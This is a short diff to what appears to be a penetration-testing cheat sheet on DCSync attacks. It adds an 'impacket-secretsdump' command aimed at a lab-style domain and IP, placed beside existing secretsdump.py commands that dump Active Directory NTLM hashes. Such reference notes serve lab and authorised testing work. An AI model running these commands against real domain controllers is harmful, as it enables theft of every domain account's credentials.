@@ -29,6 +29,7 @@ DCsync using secretsdump.py from impacket with NTLM authentication
 
 ```text
 secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm
+impacket-secretsdump htb.local/username@10.10.10.161
 ```
 
 DCsync using secretsdump.py from impacket with Kerberos Authentication
